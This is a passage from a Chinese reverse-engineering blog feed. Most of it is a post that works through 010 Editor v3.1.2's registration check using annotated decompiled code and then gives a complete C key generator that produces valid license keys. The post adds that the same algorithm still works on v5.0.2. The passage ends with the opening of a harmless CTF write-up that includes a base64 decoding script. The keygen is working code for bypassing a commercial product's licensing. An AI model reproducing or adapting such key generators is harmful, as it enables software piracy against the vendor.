//xxxx-xxxx-xxxx-xxxx-xxxx分别对应k1k2-k3k4-k5k6-k7k8-k9k10&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;	//v23其实就是一个数组，存的就是k1-k10&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;	//检测name是否等于&amp;apos;999&amp;apos;,是，则失败&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;	if ( v26 == 0x9Cu )&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;	&amp;#123;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;		LOBYTE(v32) = v23 ^ v28;                    // k1^k7&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;		LOWORD(v6) = (unsigned __int8)(v24 ^ v29);  // k2^k8&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;		LOWORD(v7) = (unsigned __int8)(v25 ^ HIBYTE(v27));// k3^k6&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;		v11 = v7 + ((_DWORD)v6 &amp;lt;&amp;lt; 8);               // v11 = k3^k6 + ((k2^k8)&amp;lt;&amp;lt;8)&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;		*(_DWORD *)(regdlg + 28) = (unsigned __int8)myCal1(v23 ^ v28);// k1^k7 =&amp;gt; 不能等于0&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;		v9 = myCal2(v11);                           // 不能等于0&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;		v10 = *(_DWORD *)(regdlg + 28);&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;		*(_DWORD *)(regdlg + 32) = (unsigned __int16)v9;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;		// v10==0,v9==0或者v9&amp;gt;0x3e8，返回231&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;		if ( !v10 || !v9 || (unsigned __int16)v9 &amp;gt; 0x3E8u )&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;		  return 231;                               &lt;/div&gt;&lt;div class=&quot;line&quot;&gt;		v12 = v10 &amp;lt; 2 ? v10 : 0;                    // v12 = 0或者1&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;	&amp;#125;else&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;	&amp;#123;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;		if(v26 == 0xFC)&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;		&amp;#123;//不可能成功&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;		&amp;#125;esle &lt;/div&gt;&lt;div class=&quot;line&quot;&gt;		&amp;#123;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;			//v26不等于0xAC，退出，返回231，失败&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;			//myCal2(k3^k6 + ((k2^k8)&amp;lt;&amp;lt;8)) &amp;gt;  0x3E8, 失败&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;			if ( v26 != 0xACu&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;			|| (v15 = v24 ^ v29,//k2^k8&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;				v16 = v25 ^ HIBYTE(v27),//k3^k6&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;				*(_DWORD *)(regdlg + 28) = 2,&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;				v14 = (unsigned __int16)myCal2(v16 + (v15 &amp;lt;&amp;lt; 8)),v11 = k3^k6 + ((k2^k8)&amp;lt;&amp;lt;8)&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;				*(_DWORD *)(regdlg + 32) = (unsigned __int16)v14,&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;				!(_WORD)v14)&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;				|| v14 &amp;gt; 0x3E8 )&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;			return 231;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;			//sub_4FD0B9( (k1^k7 + (k9^k5 + (k6^k10)&amp;lt;&amp;lt;8)&amp;lt;&amp;lt;8), xxx);&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;			//其实就是凑成十六进制数(k6^k10)(k9^k5)(k1^k7)&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;			v17 = sub_4FD0B9(&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;				  (v23 ^ v28) + (((v30 ^ (unsigned __int8)v27) + ((HIBYTE(v27) ^ v31) &amp;lt;&amp;lt; 8)) &amp;lt;&amp;lt; 8),&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;				  (char *)loc_5B8C25 + 2);&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;			v33 = v17;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;			*(_DWORD *)(regdlg + 52) = v17;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;			v12 = v17;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;		&amp;#125;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;	&amp;#125;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;	//编码name，返回给v18，&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;	v18 = myEncStr(*(const char **)(*(_DWORD *)qstrname + 12), v26 != -4, v12, *(_DWORD *)(regdlg + 32));&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;	//如果v18，如0xABCDEF10分解成0xAB，0xCD， 0xEF10,不等于v29, v28,v27就失败，其实就是&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;	//(k6k5) = 0xEF10, k7 = 0xCD, k8 = 0xAB&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;	if ( v27 != (_WORD)v18&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;		|| v28 != (unsigned __int8)((unsigned int)v18 &amp;gt;&amp;gt; 0x10u)&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;		|| v29 != (unsigned __int8)((unsigned int)v18 &amp;gt;&amp;gt; 0x18u) )&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;		return 231;                                 // 这三个条件很重要啊&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;	//下面就接近成功了，就是上面提到的返回45的结果，成功&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;	if ( v26 == 0x9Cu )&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;	&amp;#123;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;		//这里就需要regdlg + 28 = myCal1(k1^k7) &amp;gt;= a2,也就是3，传入的a2是3&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;		//然后v20就是0，那么(-v20 &amp;amp; 0x21)=0，最后返回45&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;		v20 = *(_DWORD *)(regdlg + 28) &amp;lt; a2;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;		return (-v20 &amp;amp; 0x21) + 45;                  // 成功？&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;	&amp;#125;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;	if ( v26 != 0xFCu )&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;	&amp;#123;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;		if ( v26 == 0xACu &amp;amp;&amp;amp; v33 )&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;		&amp;#123;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;		  v20 = v33 &amp;lt; a3;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;		  return (-v20 &amp;amp; 0x21) + 45;                // 成功？&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;		&amp;#125;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;	return 231;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;	&amp;#125;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;&amp;#125;&lt;/div&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;/p&gt;
&lt;p&gt;最后总结一下算法，基本可以列出一个方程类似的东西：&lt;br&gt;&lt;figure class=&quot;highlight plain&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;div class=&quot;line&quot;&gt;1&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;2&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;3&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;4&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;5&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;6&lt;/div&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;div class=&quot;line&quot;&gt;k4 = 0x9C或者0xAC&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;myCal1(k1^k7) &amp;gt;= 3;//可以任取大于等于3的值，算出k1^k7=？&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;myCal2(k3^k6 + ((k2^k8)&amp;lt;&amp;lt;8)) &amp;gt; 0;//可以任去大于0&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;myCal2(k3^k6 + ((k2^k8)&amp;lt;&amp;lt;8)) &amp;lt; 0x3E8;//小于0x3E8的某一个值，算出k3^k6 + ((k2^k8)&amp;lt;&amp;lt;8) = ？&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;k8k7k6k5 = v18;//0xABCDEF10，可以得到k5=?,k6=?,k7=?,k8=?，由此可以算出上面的k1,k2&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;sub_4FD0B9((k6^k10)(k9^k5)(k1^k7), xx) = ?//可以算出k9，k10&lt;/div&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;/p&gt;
&lt;p&gt;下面就0x9C的情况写了个注册机&lt;/p&gt;
&lt;h2 id=&quot;3-注册机&quot;&gt;&lt;a href=&quot;#3-注册机&quot; class=&quot;headerlink&quot; title=&quot;3. 注册机&quot;&gt;&lt;/a&gt;&lt;strong&gt;3. 注册机&lt;/strong&gt;&lt;/h2&gt;&lt;p&gt;根据上面的注册算法，写了个针对0x9c的注册机：&lt;br&gt;&lt;figure class=&quot;highlight plain&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;div class=&quot;line&quot;&gt;1&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;2&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;3&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;4&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;5&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;6&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;7&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;8&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;9&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;10&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;11&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;12&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;13&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;14&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;15&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;16&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;17&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;18&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;19&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;20&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;21&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;22&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;23&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;24&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;25&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;26&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;27&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;28&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;29&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;30&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;31&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;32&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;33&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;34&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;35&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;36&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;37&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;38&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;39&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;40&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;41&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;42&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;43&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;44&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;45&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;46&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;47&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;48&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;49&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;50&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;51&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;52&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;53&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;54&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;55&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;56&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;57&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;58&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;59&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;60&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;61&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;62&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;63&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;64&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;65&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;66&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;67&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;68&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;69&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;70&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;71&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;72&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;73&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;74&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;75&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;76&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;77&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;78&lt;/div&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;div class=&quot;line&quot;&gt;DWORD ckname(char* name, int isnotFC,  int islowk1k7, DWORD k3k6k2k8 )&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;&amp;#123;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;	int slen = strlen(name);&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;	if(slen &amp;gt; 0 )&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;	&amp;#123;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;		DWORD v15 = 0, v17 = 0, v16 = 0, chk = 0, v9 = 0, v8=0, v14 = 0, v5 = 0, v6 = 0;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;		while(v14 &amp;lt; slen)&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;		&amp;#123;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;			DWORD v7 = toupper(name[v14]);&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;			if(isnotFC)&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;			&amp;#123;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;				v9 = dword_B21DC4[(v17 + 15 * k3k6k2k8) &amp;amp; 0xFF]&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;				+ dword_B21DC4[(v6 + 17 * islowk1k7) &amp;amp; 0xFF]&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;				+ dword_B21DC4[(v7 + 47) &amp;amp; 0xFF] * ((v5 + dword_B21DC4[v7]) ^ dword_B21DC4[(v7 + 13) &amp;amp; 0xFF]);&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;				v8 = v16;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;			&amp;#125;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;			else&amp;#123;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;				v9 = dword_B21DC4[(v17 + 15 * k3k6k2k8) &amp;amp; 0xFF]&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;				+ dword_B21DC4[(v6 + 17 * islowk1k7) &amp;amp; 0xFF]&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;				+ dword_B21DC4[(v7 + 23) &amp;amp; 0xFF] * ((v5 + dword_B21DC4[v7]) ^ dword_B21DC4[(v7 + 63) &amp;amp; 0xFF]);&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;				v8 = v15;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;			&amp;#125;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;			v16 += 19;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;			v17 += 13;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;			v15 += 7;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;			v6 += 9;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;			v5 = dword_B21DC4[v8] + v9;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;			v14 = v14 + 1;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;		&amp;#125;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;		return v5;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;	&amp;#125;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;&amp;#125;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;int main()&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;&amp;#123;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;	char name[] = &amp;quot;&amp;quot;;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;	char key[0x20] = &amp;#123;0&amp;#125;;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;	int k4 = 0x9c;//0xac	&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;	int islowk1k7 = 3;//&amp;gt;=3&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;	int k1_xor_k7 = ((islowk1k7^0xA7)-61)^0x18;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;	int k3k6k2k8 = 1;//k3k6k2k8&amp;gt;=1 &amp;amp;&amp;amp; k3k6k2k8&amp;lt;0x3E8，其中任意一个值&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;	int k3_xor_k6_k2_xor_k8 = 0xFFFF &amp;amp; (((k3k6k2k8*11)^0x3421)-19760);&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;	k3_xor_k6_k2_xor_k8 = k3_xor_k6_k2_xor_k8^0x7892;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;	int k3_xor_k6 = k3_xor_k6_k2_xor_k8 &amp;amp; 0xff;//低位&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;	int k2_xor_k8 = k3_xor_k6_k2_xor_k8 &amp;gt;&amp;gt; 8;//高位&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;	int k1=0, k2=0, k3=0, k5=0, k6=0, k7=0, k8=0, k9=0, k10=0;//&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;	printf(&amp;quot;****************************************************\n&amp;quot;);&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;	printf(&amp;quot;************* 010 Editor v3.1.2 keygen *************\n&amp;quot;);&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;	printf(&amp;quot;*************   by anhkgg 2014-11-18   *************\n&amp;quot;);&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;	printf(&amp;quot;****************************************************\n\n&amp;quot;);&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;	printf(&amp;quot;name&amp;gt;&amp;quot;);&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;	&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;	scanf(&amp;quot;%s&amp;quot;, name);&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;	&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;	if(!stricmp(name, &amp;quot;999&amp;quot;))&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;	&amp;#123;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;		printf(&amp;quot;name is not valid!\n&amp;quot;);&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;		system(&amp;quot;pause&amp;quot;);&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;		return 0;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;	&amp;#125;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;	DWORD name_chk = ckname(name, k4==0x9C?1:0, islowk1k7&amp;lt;2?islowk1k7:0, k3k6k2k8) ;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;	k5 = name_chk &amp;amp; 0xFF;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;	k6 = (name_chk &amp;amp; 0xFFFF)&amp;gt;&amp;gt;8;//&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;	k7 = (name_chk &amp;gt;&amp;gt; 16) &amp;amp; 0xFF;//&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;	k8 = (name_chk &amp;gt;&amp;gt; 24) &amp;amp; 0xFF;//&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;	k1 = k1_xor_k7 ^ k7;//&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;	k2 = k2_xor_k8 ^ k8;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;	k3 = k3_xor_k6 ^ k6;//&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;	printf(&amp;quot;key&amp;gt;%02x%02x-%02x%02x-%02x%02x-%02x%02x\n\n&amp;quot;, k1, k2, k3, k4, k5, k6, k7, k8);&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;	system(&amp;quot;pause&amp;quot;);&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;	return 0;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;&amp;#125;&lt;/div&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;/p&gt;
&lt;h2 id=&quot;4-其他&quot;&gt;&lt;a href=&quot;#4-其他&quot; class=&quot;headerlink&quot; title=&quot;4. 其他&quot;&gt;&lt;/a&gt;&lt;strong&gt;4. 其他&lt;/strong&gt;&lt;/h2&gt;&lt;ul&gt;
&lt;li&gt;本次分析针对的是010 v3.1.2&lt;/li&gt;
&lt;li&gt;希望各位大牛不要见笑，欢迎交流&lt;/li&gt;
&lt;li&gt;网站：&lt;a href=&quot;http://anhkgg.gitcafe.com&quot; target=&quot;_blank&quot; rel=&quot;external&quot;&gt;anhkgg.gitcafe.com&lt;/a&gt;， &lt;a href=&quot;http://www.devilstep.com&quot; target=&quot;_blank&quot; rel=&quot;external&quot;&gt;www.devilstep.com&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;转载请注明出处：&lt;a href=&quot;http://anhkgg.gitcafe.com/010%E6%B3%A8%E5%86%8C%E7%AE%97%E6%B3%95%E5%88%86%E6%9E%90/&quot; target=&quot;_blank&quot; rel=&quot;external&quot;&gt;anhkgg.gitcafe.com/010%E6%B3%A8%E5%86%8C%E7%AE%97%E6%B3%95%E5%88%86%E6%9E%90/&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;更新：最新版v5.0.2，分析之后，算法流程基本没有变化，只需要myCal1(k1^k7)条件更新一下就行！&lt;/li&gt;
&lt;/ul&gt;
</content>
    
    <summary type="html">
    
      &lt;h2 id=&quot;1-关键函数定位&quot;&gt;&lt;a href=&quot;#1-关键函数定位&quot; class=&quot;headerlink&quot; title=&quot;1. 关键函数定位&quot;&gt;&lt;/a&gt;&lt;strong&gt;1. 关键函数定位&lt;/strong&gt;&lt;/h2&gt;&lt;p&gt;进入register窗口，随便填入name，然后check license，弹框信息”Invalid name or password. Please enter your name and password exactly as given when you purchased 010 Editor (make sure no quotes are included).”，通过该信息在IDA中找到对应函数地址，基本可以确认是关键函数位置，函数居然有名字，这是作者故意留下的吗。下面是整个验证函数流程：&lt;/p&gt;
    
    </summary>
    
      <category term="reverse" scheme="http://anhkgg.github.io/categories/reverse/"/>
    
    
      <category term="010editor" scheme="http://anhkgg.github.io/tags/010editor/"/>
    
  </entry>
  
  <entry>
    <title>hctf writeup</title>
    <link href="http://anhkgg.github.io/hctf-writeup/"/>
    <id>http://anhkgg.github.io/hctf-writeup/</id>
    <published>2014-11-10T01:08:58.000Z</published>
    <updated>2014-11-10T02:15:50.000Z</updated>
    
    <content type="html">&lt;p&gt;&lt;strong&gt;1. 丘比龙的最爱&lt;/strong&gt;&lt;br&gt;传说，丘比龙是丘比特的弟弟，丘比龙是一只小爱神，虽然有两只翅膀，但因为吃多了，导致身体太胖，所以飞不起来~那么问题来了?!丘比龙吃什么食物吃多了变胖了&lt;br&gt;百度之：甜甜圈&lt;/p&gt;
&lt;a id=&quot;more&quot;&gt;&lt;/a&gt;
&lt;p&gt;&lt;strong&gt;1. nvshen&lt;/strong&gt;&lt;br&gt;猫流大大发现一个女神，你能告诉我女神的名字么（名字即是flag） &lt;a href=&quot;http://107.189.158.112/0aab9b20410fdd880c53922048023266/nvshen.zip&quot; target=&quot;_blank&quot; rel=&quot;external&quot;&gt;http://107.189.158.112/0aab9b20410fdd880c53922048023266/nvshen.zip&lt;/a&gt;&lt;br&gt;打开大量数据，感觉是base64，解密了前一部分数据看到PNG, IHDR字符，应该就是png图片了，然后python写了段脚本：&lt;br&gt;&lt;figure class=&quot;highlight plain&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;div class=&quot;line&quot;&gt;1&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;2&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;3&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;4&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;5&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;6&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;7&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;8&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;9&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;10&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;11&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;12&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;13&lt;/div&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;div class=&quot;line&quot;&gt;import base64&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;f1 = open(&amp;quot;nvshen.txt&amp;quot;, &amp;quot;r&amp;quot;)&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;f2 = open(&amp;quot;nvshen.png&amp;quot;, &amp;quot;wb&amp;quot;)&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;while 1:&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;	buf = f1.read(12)&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;	if not buf:&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;		break;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;	#print buf, base64.decodestring(buf)&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;	f2.write(base64.decodestring(buf))	&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;f1.close()&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;f2.close()&lt;/div&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;/p&gt;
&lt;p&gt;得到一张女神照片，纠结了会，google图片之，找到女神名字“爱新觉罗·启星”，被中间的点坑了几次，然后flag是“爱新觉罗启星”， 出题人原来喜欢她啊&lt;br&gt;&lt;img src=&quot;http://www.taihainet.com/news/UploadFiles_6334/201306/20130618160811617.jpg&quot; alt=&quot;img&quot;&gt;&lt;/p&gt;
